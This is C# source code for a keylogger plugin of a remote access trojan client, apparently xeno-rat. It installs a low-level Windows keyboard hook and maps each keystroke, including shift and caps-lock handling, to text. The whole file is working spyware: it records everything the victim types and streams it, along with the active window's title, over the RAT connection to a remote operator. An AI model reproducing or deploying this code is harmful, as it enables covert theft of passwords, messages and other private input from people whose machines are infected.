using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;

        Node node;


        List<string> SendQueue = new List<string>();
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            
            this.node = node;
            IntPtr hookHandle=IntPtr.Zero;
            HookCallbackDelegate hcDelegate = HookCallback;
            Process currproc = Process.GetCurrentProcess();
            string mainModuleName = currproc.MainModule.ModuleName;
            currproc.Dispose();
            new Thread(() => {
                hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
                if (!Application.MessageLoop)
                {
                    Application.Run();
                }
            }).Start();
            while (node.Connected())
            {
                if (SendQueue.Count > 0)
                {
                    string activeWindow = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*","");
                    string chars = string.Join("", SendQueue);
                    SendQueue.Clear();
                    await sendKeyData(activeWindow, chars);
                }
                await Task.Delay(1);
            }
            if (hookHandle != IntPtr.Zero) 
            {
                UnhookWindowsHookEx(hookHandle);
            }

        }

        public async Task sendKeyData(string open_application, string charectar) 
        {
            if (node == null || !node.Connected()) return;
            await node.SendAsync(Encoding.UTF8.GetBytes(open_application));
            await node.SendAsync(Encoding.UTF8.GetBytes(charectar));
        }

        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                string character = GetCharacterFromKey((uint)vkCode, isShiftPressed);
                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)//check for caps lock
                {
                    character = character.ToUpper();
                }
                SendQueue.Add(character);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static Dictionary<uint, string> nonVisibleCharacters = new Dictionary<uint, string>()
        {
            { 0x08, "[backspace]" },
            { 0x09, "[tab]" },
            { 0x0D, "[enter]" },
            { 0x1B, "[escape]" },
            { 0x20, "[space]" },
            { 0x2E, "[delete]" },
            { 0x25, "[left]" },
            { 0x26, "[up]" },
            { 0x27, "[right]" },
            { 0x28, "[down]" },
            { 0x2C, "[print screen]" },
            { 0x2D, "[insert]" },
            { 0x2F, "[help]" },
            { 0x5B, "[left windows]" },
            { 0x5C, "[right windows]" },
            { 0x5D, "[applications]" },
            { 0x5F, "[sleep]" },
            { 0x70, "[F1]" },
            { 0x71, "[F2]" },
            { 0x72, "[F3]" },
            { 0x73, "[F4]" },
            { 0x74, "[F5]" },
            { 0x75, "[F6]" },
            { 0x76, "[F7]" },
            { 0x77, "[F8]" },
            { 0x78, "[F9]" },
            { 0x79, "[F10]" },
            { 0x7A, "[F11]" },
            { 0x7B, "[F12]" },
            { 0xBA, ";" },
            { 0xBB, "=" },
            { 0xBC, "," },
            { 0xBD, "-" },
            { 0xBE, "." },
            { 0xBF, "/" },
            { 0xC0, "`" },
            { 0xDB, "[" },
            { 0xDC, "\\" },
            { 0xDD, "]" },
            { 0xDE, "'" },
            { 0xDF, "[caps lock]" },
            { 0xE1, "[ime hangul mode]" },
            { 0xE3, "[ime junja mode]" },
            { 0xE4, "[ime final mode]" },
            { 0xE5, "[ime kanji mode]" },
            { 0xE6, "[ime hanja mode]" },
            { 0xE8, "[ime off]" },
            { 0xE9, "[ime on]" },
            { 0xEA, "[ime convert]" },
            { 0xEB, "[ime non-convert]" },
            { 0xEC, "[ime accept]" },
            { 0xED, "[ime mode change request]" },
            { 0xF1, "[oem specific]" },
            { 0xFF, "[oem auto]" },
            { 0xFE, "[oem enlarge window]" },
            { 0xFD, "[oem reduce window]" },
            { 0xFC, "[oem copy]" },
            { 0xFB, "[oem enlarge font]" },
            { 0xFA, "[oem reduce font]" },
            { 0xF9, "[oem jump]" },
            { 0xF8, "[oem pa1]" },
            { 0xF7, "[oem clear]" }
        };

        private static bool[] keyStates = new bool[256];

        private static string GetCharacterFromKey(uint virtualKeyCode, bool isShiftPressed)
        {
            StringBuilder receivingBuffer = new StringBuilder(5);
            byte[] keyboardState = new byte[256];

            // Set the state of Shift key based on the passed parameter
            keyboardState[0x10] = (byte)(isShiftPressed ? 0x80 : 0);

            // Map the virtual key to the corresponding character
            int result = ToUnicode(virtualKeyCode, 0, keyboardState, receivingBuffer, receivingBuffer.Capacity, 0);

            if (result > 0)
            {
                string character = receivingBuffer.ToString();

                // Replace non-visible characters with descriptive words using the dictionary
                if (nonVisibleCharacters.ContainsKey(virtualKeyCode))
                {
                    string nonVisibleCharacter = nonVisibleCharacters[virtualKeyCode];

                    // Apply Shift key state to the non-visible character
                    if (isShiftPressed)
                    {
                        // Apply Shift key modifications based on the non-visible character
                        switch (nonVisibleCharacter)
                        {
                            case ";":
                                return ":";
                            case "=":
                                return "+";
                            case ",":
                                return "<";
                            case "-":
                                return "_";
                            case ".":
                                return ">";
                            case "/":
                                return "?";
                            case "`":
                                return "~";
                            case "[":
                                return "{";
                            case "\\":
                                return "|";
                            case "]":
                                return "}";
                            case "'":
                                return "\"";
                        }
                    }

                    return nonVisibleCharacter;
                }

                return character;
            }

            return string.Empty;
        }

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
            int bufferSize, uint flags);

    }
}
